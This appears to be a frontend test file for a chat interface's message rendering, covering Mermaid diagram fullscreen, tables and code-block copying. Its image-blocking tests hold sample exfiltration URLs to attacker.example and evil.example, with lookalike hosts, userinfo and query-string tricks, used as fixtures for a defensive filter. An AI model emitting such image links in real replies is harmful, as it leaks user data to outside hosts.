import { act, cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import { ThemeProvider } from "next-themes";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { setEmbedRoot } from "@/lib/host";
import { MermaidPreview } from "@/shell/MermaidPreview";
import { DIAGRAM_WAIT_MS, MermaidBlock, MermaidFullscreenProvider } from "./MermaidBlock";
import { Reasoning, ReasoningContent } from "./reasoning";
import { Message, MessageAction, MessageActions, MessageContent, MessageResponse } from "./message";

const clipboardDescriptor = Object.getOwnPropertyDescriptor(Navigator.prototype, "clipboard");
const execCommandDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, "execCommand");

afterEach(() => {
  setEmbedRoot(null);
  vi.unstubAllGlobals();
  cleanup();
  vi.restoreAllMocks();
  if (clipboardDescriptor) {
    Object.defineProperty(Navigator.prototype, "clipboard", clipboardDescriptor);
  } else {
    delete (Navigator.prototype as { clipboard?: unknown }).clipboard;
  }

  if (execCommandDescriptor) {
    Object.defineProperty(Document.prototype, "execCommand", execCommandDescriptor);
  } else {
    delete (Document.prototype as { execCommand?: unknown }).execCommand;
  }
});

describe("MessageContent", () => {
  it("uses the settings-driven interface text token", () => {
    render(<MessageContent>Message text</MessageContent>);

    const content = screen.getByText("Message text");
    expect(content).toHaveClass("text-ui", "group-[.is-user]:px-3", "group-[.is-user]:py-2");
    expect(content).not.toHaveClass("text-[0.8125rem]", "leading-[1.125rem]");
    expect(content).not.toHaveClass("group-[.is-user]:px-4", "group-[.is-user]:py-3");
  });
});

describe("Message", () => {
  it("keeps the message shrinkable", () => {
    render(<Message data-testid="message" from="assistant" />);

    expect(screen.getByTestId("message")).toHaveClass("min-w-0");
  });

  it("keeps a caller's width override alongside min-w-0", () => {
    render(<Message className="max-w-3xl" data-testid="message" from="assistant" />);

    const message = screen.getByTestId("message");
    expect(message).toHaveClass("min-w-0", "max-w-3xl");
  });
});

describe("MessageAction", () => {
  it("uses muted color by default and foreground color on hover", () => {
    render(
      <MessageAction label="Copy">
        <svg aria-hidden />
      </MessageAction>,
    );

    expect(screen.getByRole("button", { name: "Copy" })).toHaveClass(
      "text-muted-foreground",
      "hover:text-foreground",
    );
  });
});

describe("MessageActions", () => {
  it("uses 12px spacing between actions", () => {
    render(<MessageActions data-testid="message-actions">Actions</MessageActions>);

    expect(screen.getByTestId("message-actions")).toHaveClass("gap-3");
  });
});

// Streamdown renders a diagram only once an IntersectionObserver reports it
// visible; report every observed element visible so diagrams render in jsdom.
class VisibleIntersectionObserver {
  private readonly callback: IntersectionObserverCallback;
  constructor(callback: IntersectionObserverCallback) {
    this.callback = callback;
  }
  observe(target: Element) {
    this.callback(
      [{ isIntersecting: true, target } as IntersectionObserverEntry],
      this as unknown as IntersectionObserver,
    );
  }
  unobserve() {}
  disconnect() {}
  takeRecords(): IntersectionObserverEntry[] {
    return [];
  }
}

describe("MessageResponse", () => {
  it("blocks external image markdown and renders a placeholder", async () => {
    render(<MessageResponse>{"![leak](https://attacker.example/pixel.png)"}</MessageResponse>);

    expect(document.querySelector('img[src^="https://attacker.example"]')).toBeNull();
    expect(await screen.findByText("[Image blocked: leak]")).toBeTruthy();
  });

  describe("allowGitHubAttachmentImages", () => {
    const asset = "https://github.com/user-attachments/assets/381e47c8-e3f1-4c3e-9b3d-aac5cfb3557b";

    it("shows GitHub attachment images without a referrer", async () => {
      render(<MessageResponse allowGitHubAttachmentImages>{`![shot](${asset})`}</MessageResponse>);

      const image = await screen.findByRole("img", { name: "shot" });
      expect(image).toHaveAttribute("src", asset);
      expect(image).toHaveAttribute("referrerpolicy", "no-referrer");
    });

    it.each([
      ["another host", "https://attacker.example/pixel.png?q=secret"],
      ["a path escaping the assets", "https://github.com/user-attachments/assets/../../x/y.png"],
      ["a query string", `${asset}?q=secret`],
      ["another GitHub path", "https://github.com/attacker/repo/raw/main/pixel.png"],
      ["plain http", asset.replace("https:", "http:")],
      ["a fragment", `${asset}#x`],
      ["a trailing slash", `${asset}/`],
      ["a lookalike host", asset.replace("github.com", "github.com.evil.example")],
      ["userinfo", asset.replace("https://", "https://github.com@evil.example/")],
      ["an id that isn't a UUID", "https://github.com/user-attachments/assets/deadbeef"],
    ])("still blocks %s", async (_case, url) => {
      render(<MessageResponse allowGitHubAttachmentImages>{`![leak](${url})`}</MessageResponse>);

      expect(await screen.findByText("[Image blocked: leak]")).toBeTruthy();
      expect(document.querySelector("img")).toBeNull();
    });

    it("drops every other attribute a raw-HTML GitHub image carries", async () => {
      render(
        <MessageResponse allowGitHubAttachmentImages>
          {`<img src="${asset}" alt="shot" srcset="https://evil.example/x.png 1x">`}
        </MessageResponse>,
      );

      const image = await screen.findByRole("img", { name: "shot" });
      expect(image).toHaveAttribute("src", asset);
      expect(image).not.toHaveAttribute("srcset");
    });

    it("doesn't treat a raw parked-image tag as a GitHub image", async () => {
      render(
        <MessageResponse allowGitHubAttachmentImages>
          {
            'before <omnigent-github-image src="https://evil.example/x.png"></omnigent-github-image>'
          }
        </MessageResponse>,
      );

      await screen.findByText(/before/);
      expect(document.querySelector("img")).toBeNull();
    });

    it("leaves GitHub attachment images blocked without the option", async () => {
      render(<MessageResponse>{`![shot](${asset})`}</MessageResponse>);

      expect(await screen.findByText("[Image blocked: shot]")).toBeTruthy();
    });

    it("leaves links as the default renderer treats them", async () => {
      render(
        <MessageResponse allowGitHubAttachmentImages>
          {"[docs](docs/x.md) [root](/README.md)"}
        </MessageResponse>,
      );

      expect(await screen.findByText(/\[blocked\]/)).toHaveTextContent("docs [blocked]");
      expect(screen.getByRole("link", { name: "root" })).toHaveAttribute("href", "/README.md");
    });
  });

  it("re-renders when rendering props change even if the text is unchanged", async () => {
    const { container, rerender } = render(
      <MessageResponse className="math-config-a">same text</MessageResponse>,
    );

    expect(container.firstElementChild).toHaveClass("math-config-a");

    rerender(<MessageResponse className="math-config-b">same text</MessageResponse>);

    await waitFor(() => {
      expect(container.firstElementChild).toHaveClass("math-config-b");
    });
  });

  it("explains an invalid mermaid fence instead of dumping the parser error", async () => {
    vi.stubGlobal("IntersectionObserver", VisibleIntersectionObserver);
    render(
      <MessageResponse>
        {
          "```mermaid\nsequenceDiagram\n    A->>B: hi\n    Note over A,B: once; twice\n    A=>B: again\n```"
        }
      </MessageResponse>,
    );

    const card = await screen.findByTestId("mermaid-error", {}, { timeout: 10_000 });
    expect(card.textContent).toContain("Mermaid couldn't parse line 3");
    expect(card.querySelector("code")?.textContent).toBe("Note over A,B: once; twice");
    expect(card.textContent).toContain("#59;");
  }, 15_000);

  it("gives prose a break opportunity for an unbroken run (OMNI-2900)", () => {
    const { container } = render(<MessageResponse>same text</MessageResponse>);

    expect(container.firstElementChild).toHaveClass("wrap-anywhere");
  });

  it("keeps wrap-anywhere alongside a caller-supplied className", () => {
    const { container } = render(
      <MessageResponse className="math-config-a">same text</MessageResponse>,
    );

    expect(container.firstElementChild).toHaveClass("wrap-anywhere", "math-config-a");
  });
});

describe.each([true, false])("Mermaid fullscreen (embedded=%s)", (embedded) => {
  const source = "flowchart LR\n  Alpha --> Beta";
  const markdown = `\`\`\`mermaid\n${source}\n\`\`\``;
  let root: HTMLDivElement;
  let originalGetBBox: PropertyDescriptor | undefined;

  beforeEach(() => {
    vi.stubGlobal("IntersectionObserver", VisibleIntersectionObserver);
    // jsdom has no SVG layout; keep the real Mermaid renderer and supply its measurements.
    originalGetBBox = Object.getOwnPropertyDescriptor(SVGElement.prototype, "getBBox");
    Object.defineProperty(SVGElement.prototype, "getBBox", {
      configurable: true,
      value: () => ({ x: 0, y: 0, width: 100, height: 40 }),
    });
    root = document.createElement("div");
    root.className = "omnigent-app";
    document.body.appendChild(root);
    setEmbedRoot(embedded ? root : null);
  });

  afterEach(() => {
    cleanup();
    root.remove();
    if (originalGetBBox) Object.defineProperty(SVGElement.prototype, "getBBox", originalGetBBox);
    else delete (SVGElement.prototype as { getBBox?: unknown }).getBBox;
  });

  async function findInlineDiagram(container: HTMLElement) {
    const selector = '.chat-mermaid svg[id^="mermaid-"]';
    await waitFor(
      () => {
        expect(container.querySelector(selector)).not.toBeNull();
      },
      { timeout: 10_000 },
    );
    return container.querySelector(selector)!;
  }

  it.each([
    ["chat", () => <MessageResponse>{markdown}</MessageResponse>],
    ["preview/editor", () => <MermaidPreview source={source} />],
    [
      "reasoning",
      () => (
        <Reasoning open>
          <ReasoningContent>{markdown}</ReasoningContent>
        </Reasoning>
      ),
    ],
  ])(
    "opens and dismisses the diagram from %s",
    async (_surface, content) => {
      const { container } = render(content(), { container: root });
      const svg = await findInlineDiagram(container);
      expect(svg.textContent).toContain("Alpha");
      expect(screen.getAllByTitle("View fullscreen")).toHaveLength(1);
      fireEvent.click(screen.getByTitle("View fullscreen"));
      const exit = screen.getByTitle("Exit fullscreen");
      const overlay = exit.parentElement!;
      expect(overlay.parentElement).toBe(embedded ? root : document.body);
      expect(overlay.querySelector('svg[id^="mermaid-"]')?.outerHTML).toBe(svg.outerHTML);
      fireEvent.click(exit);
      expect(screen.queryByTitle("Exit fullscreen")).toBeNull();
      fireEvent.click(screen.getByTitle("View fullscreen"));
      fireEvent.keyDown(window, { key: "Escape" });
      expect(screen.queryByTitle("Exit fullscreen")).toBeNull();
    },
    15_000,
  );

  it("keeps the diagram open and current as a streamed reply grows and settles", async () => {
    const grown = `${source}\n  Beta --> Gamma`;
    const reply = (mode: "streaming" | "static", diagram: string, fence: string) => (
      <MermaidFullscreenProvider resetKey="/sessions/a">
        <MessageResponse mode={mode}>{`\`\`\`mermaid\n${diagram}\n${fence}`}</MessageResponse>
      </MermaidFullscreenProvider>
    );
    const { container, rerender } = render(reply("streaming", source, ""), {
      container: root,
      reactStrictMode: true,
    });
    const partialSvg = await findInlineDiagram(container);
    const streamedBlock = container.querySelector(".chat-mermaid")!;
    fireEvent.click(screen.getByTitle("View fullscreen"));
    const overlay = screen.getByTitle("Exit fullscreen").parentElement!;
    const overlayMarkup = () => overlay.querySelector('svg[id^="mermaid-"]')?.outerHTML;

    // An unclosed fence redraws the same block in place as the source grows.
    rerender(reply("streaming", grown, ""));
    await waitFor(() => expect(overlay.textContent).toContain("Gamma"), { timeout: 10_000 });
    expect(partialSvg.isConnected).toBe(false);
    expect(container.querySelector(".chat-mermaid")).toBe(streamedBlock);
    const inlineMarkup = () => streamedBlock.querySelector('svg[id^="mermaid-"]')?.outerHTML;
    await waitFor(() => expect(overlayMarkup()).toBe(inlineMarkup()));

    const streamedMarkup = overlayMarkup();
    rerender(reply("static", grown, "```"));
    expect(streamedBlock.isConnected).toBe(false);
    expect(overlayMarkup()).toBe(streamedMarkup);
    const settledSvg = await findInlineDiagram(container);
    await waitFor(() => expect(overlayMarkup()).toBe(settledSvg.outerHTML));
    expect(overlay.parentElement).toBe(embedded ? root : document.body);
    fireEvent.keyDown(window, { key: "Escape" });
    expect(screen.queryByTitle("Exit fullscreen")).toBeNull();
  }, 15_000);

  it("opens a diagram clicked before it was drawn once the settled reply draws it", async () => {
    const reply = (mode: "streaming" | "static") => (
      <MermaidFullscreenProvider resetKey="/sessions/a">
        <MessageResponse mode={mode}>{markdown}</MessageResponse>
      </MermaidFullscreenProvider>
    );
    // The app renders under StrictMode, which replays mount effects.
    const { container, rerender } = render(reply("streaming"), {
      container: root,
      reactStrictMode: true,
    });
    const streamedBlock = container.querySelector(".chat-mermaid")!;
    expect(streamedBlock.querySelector('svg[id^="mermaid-"]')).toBeNull();
    fireEvent.click(screen.getByTitle("View fullscreen"));

    rerender(reply("static"));
    expect(streamedBlock.isConnected).toBe(false);
    const settledSvg = await findInlineDiagram(container);

    const overlay = (await screen.findByTitle("Exit fullscreen")).parentElement!;
    expect(overlay.querySelector('svg[id^="mermaid-"]')?.outerHTML).toBe(settledSvg.outerHTML);
  }, 15_000);

  it("closes the diagram when the file preview moves to another file", async () => {
    const preview = (diagram: string) => (
      <MermaidFullscreenProvider resetKey="/sessions/a">
        <MermaidPreview source={diagram} />
      </MermaidFullscreenProvider>
    );
    const { container, rerender } = render(preview(source), {
      container: root,
      reactStrictMode: true,
    });
    await findInlineDiagram(container);
    fireEvent.click(screen.getByTitle("View fullscreen"));
    expect(screen.getByTitle("Exit fullscreen")).toBeInTheDocument();

    rerender(preview("flowchart LR\n  Gamma --> Delta"));
    await act(async () => {});
    expect(screen.queryByTitle("Exit fullscreen")).toBeNull();
  }, 15_000);
});

describe("Mermaid fullscreen before the diagram is drawn", () => {
  const draw = async (testId: string, id: string) => {
    await act(async () => {
      screen.getByTestId(testId).innerHTML = `<svg id="mermaid-${id}"><text>${id}</text></svg>`;
    });
  };
  const diagramBlock = (testId: string) => <MermaidBlock block={<div data-testid={testId} />} />;
  const reply = (testId: string, source: string) => (
    <MermaidFullscreenProvider resetKey="/sessions/a">
      <MermaidBlock key={testId} block={<div data-testid={testId}>{source}</div>} />
    </MermaidFullscreenProvider>
  );
  const overlayDiagram = () =>
    screen.getByTitle("Exit fullscreen").parentElement!.querySelector('svg[id^="mermaid-"]');

  afterEach(() => {
    vi.useRealTimers();
  });

  it("opens once Mermaid finishes drawing the clicked diagram", async () => {
    render(diagramBlock("diagram"));
    fireEvent.click(screen.getByTitle("View fullscreen"));
    expect(screen.queryByTitle("Exit fullscreen")).toBeNull();

    await draw("diagram", "a");
    expect(overlayDiagram()?.id).toBe("mermaid-a");
  });

  it.each([
    ["the wait expires", () => vi.advanceTimersByTime(DIAGRAM_WAIT_MS)],
    ["the clock passes the deadline", () => vi.setSystemTime(Date.now() + DIAGRAM_WAIT_MS)],
    ["Escape is pressed", () => fireEvent.keyDown(window, { key: "Escape" })],
  ])("stays closed when %s first", async (_case, cancel) => {
    vi.useFakeTimers();
    render(diagramBlock("diagram"));
    fireEvent.click(screen.getByTitle("View fullscreen"));
    act(() => {
      cancel();
    });

    await draw("diagram", "a");
    expect(screen.queryByTitle("Exit fullscreen")).toBeNull();
  });

  it.each([
    ["the same diagram", "flowchart LR; A-->B", "mermaid-a"],
    ["a different diagram", "flowchart LR; A-->C", undefined],
  ])("after a remount, opens only for %s", async (_case, settledSource, shownId) => {
    const { rerender } = render(reply("streamed", "flowchart LR; A"));
    fireEvent.click(screen.getByTitle("View fullscreen"));
    rerender(reply("streamed", "flowchart LR; A-->B"));

    rerender(reply("settled", settledSource));
    await draw("settled", "a");
    const exit = screen.queryByTitle("Exit fullscreen");
    expect(exit?.parentElement?.querySelector('svg[id^="mermaid-"]')?.id).toBe(shownId);
  });

  it.each([
    ["an open diagram", true],
    ["a waiting click", false],
  ])("drops %s when its block unmounts without a replacement", async (_case, drawnFirst) => {
    const { rerender } = render(reply("clicked", "flowchart LR; A-->B"));
    if (drawnFirst) await draw("clicked", "a");
    fireEvent.click(screen.getByTitle("View fullscreen"));
    rerender(<MermaidFullscreenProvider resetKey="/sessions/a">{null}</MermaidFullscreenProvider>);
    await act(async () => {});
    expect(screen.queryByTitle("Exit fullscreen")).toBeNull();

    rerender(reply("later", "flowchart LR; A-->B"));
    await draw("later", "a");
    expect(screen.queryByTitle("Exit fullscreen")).toBeNull();
  });

  it("keeps the original wait after a remount", async () => {
    vi.useFakeTimers();
    const { rerender } = render(reply("streamed", "flowchart LR; A-->B"));
    fireEvent.click(screen.getByTitle("View fullscreen"));
    act(() => {
      vi.advanceTimersByTime(DIAGRAM_WAIT_MS - 1_000);
    });

    rerender(reply("settled", "flowchart LR; A-->B"));
    act(() => {
      vi.advanceTimersByTime(1_000);
    });
    await draw("settled", "a");
    expect(screen.queryByTitle("Exit fullscreen")).toBeNull();
  });

  it("shows the diagram clicked last", async () => {
    render(
      <MermaidFullscreenProvider resetKey="/sessions/a">
        {diagramBlock("first")}
        {diagramBlock("second")}
      </MermaidFullscreenProvider>,
    );
    await draw("second", "b");
    const [first, second] = screen.getAllByTitle("View fullscreen");
    fireEvent.click(first!);
    fireEvent.click(second!);
    expect(overlayDiagram()?.id).toBe("mermaid-b");

    await draw("first", "a");
    expect(screen.getAllByTitle("Exit fullscreen")).toHaveLength(1);
    expect(overlayDiagram()?.id).toBe("mermaid-b");
  });

  it.each([
    ["page", "/sessions/b", "light"],
    ["theme", "/sessions/a", "dark"],
  ])("closes and drops a waiting click when the %s changes", async (_case, resetKey, theme) => {
    const page = (key: string, forcedTheme: string) => (
      <ThemeProvider forcedTheme={forcedTheme}>
        <MermaidFullscreenProvider resetKey={key}>
          {diagramBlock("drawn")}
          {diagramBlock("waiting")}
        </MermaidFullscreenProvider>
      </ThemeProvider>
    );
    const { rerender } = render(page("/sessions/a", "light"));
    await draw("drawn", "a");
    const [drawn, waiting] = screen.getAllByTitle("View fullscreen");
    fireEvent.click(drawn!);
    expect(overlayDiagram()?.id).toBe("mermaid-a");

    rerender(page(resetKey, theme));
    expect(screen.queryByTitle("Exit fullscreen")).toBeNull();

    fireEvent.click(waiting!);
    rerender(page("/sessions/a", "light"));
    await draw("waiting", "b");
    expect(screen.queryByTitle("Exit fullscreen")).toBeNull();
  });
});

it("preserves ordinary code fences in reasoning", () => {
  const { container } = render(
    <Reasoning open>
      <ReasoningContent>{"```text\nplain code\n```"}</ReasoningContent>
    </Reasoning>,
  );
  expect(container.querySelector('[data-streamdown="code-block"]')).toHaveTextContent("plain code");
  expect(screen.queryByTitle("View fullscreen")).toBeNull();
  expect(screen.queryByRole("button", { name: "Toggle word wrap" })).toBeNull();
});

describe("MessageResponse table fullscreen", () => {
  const tableMarkdown = "| Name | Value |\n| --- | --- |\n| Alpha | One |";

  it("opens inside the embed root and closes from the fullscreen control", async () => {
    const embedRoot = document.createElement("div");
    document.body.appendChild(embedRoot);
    setEmbedRoot(embedRoot);
    render(<MessageResponse>{tableMarkdown}</MessageResponse>);

    fireEvent.click(await screen.findByRole("button", { name: "View fullscreen" }));

    const dialog = within(embedRoot).getByRole("dialog", { name: "View fullscreen" });
    expect(within(dialog).getByRole("cell", { name: "Alpha" })).toBeInTheDocument();

    fireEvent.click(within(dialog).getByRole("button", { name: "Exit fullscreen" }));
    expect(within(embedRoot).queryByRole("dialog", { name: "View fullscreen" })).toBeNull();
    embedRoot.remove();
  });

  it("closes the fullscreen table with Escape", async () => {
    render(<MessageResponse>{tableMarkdown}</MessageResponse>);
    fireEvent.click(await screen.findByRole("button", { name: "View fullscreen" }));

    expect(screen.getByRole("dialog", { name: "View fullscreen" })).toBeInTheDocument();
    fireEvent.keyDown(document, { key: "Escape" });
    expect(screen.queryByRole("dialog", { name: "View fullscreen" })).toBeNull();
  });
});

describe("MessageResponse code-block copy", () => {
  it("wraps code by default and exposes the wrap state through the toggle", async () => {
    const { container } = render(
      <MessageResponse>{"```ts\nconst value = 'horizontalScrolling';\n```"}</MessageResponse>,
    );

    const toggle = await screen.findByRole("button", { name: "Toggle word wrap" });
    const block = container.querySelector(".chat-code-block");
    expect(toggle).toHaveAttribute("aria-pressed", "true");
    expect(block).toHaveClass("chat-code-wrap");

    fireEvent.click(toggle);
    expect(toggle).toHaveAttribute("aria-pressed", "false");
    expect(block).not.toHaveClass("chat-code-wrap");

    fireEvent.click(toggle);
    expect(toggle).toHaveAttribute("aria-pressed", "true");
    expect(block).toHaveClass("chat-code-wrap");
  });

  it("copies the exact fenced code text through the fallback path", async () => {
    const copiedText: string[] = [];
    Object.defineProperty(Navigator.prototype, "clipboard", {
      configurable: true,
      value: undefined,
    });
    Object.defineProperty(Document.prototype, "execCommand", {
      configurable: true,
      value: vi.fn((command: string) => {
        expect(command).toBe("copy");
        const event = new Event("copy", {
          bubbles: true,
          cancelable: true,
        }) as ClipboardEvent;
        Object.defineProperty(event, "clipboardData", {
          configurable: true,
          value: {
            setData: (type: string, value: string) => {
              expect(type).toBe("text/plain");
              copiedText.push(value);
            },
          },
        });
        document.dispatchEvent(event);
        return true;
      }),
    });

    render(
      <MessageResponse>{"```ts\nconst value = 1;\nconsole.log(value);\n```"}</MessageResponse>,
    );

    fireEvent.click(await screen.findByRole("button", { name: "Copy Code" }));

    await waitFor(() => {
      expect(copiedText).toEqual(["const value = 1;\nconsole.log(value);\n"]);
    });
    expect(screen.getByRole("button", { name: "Download file" })).toBeInTheDocument();
  });
});
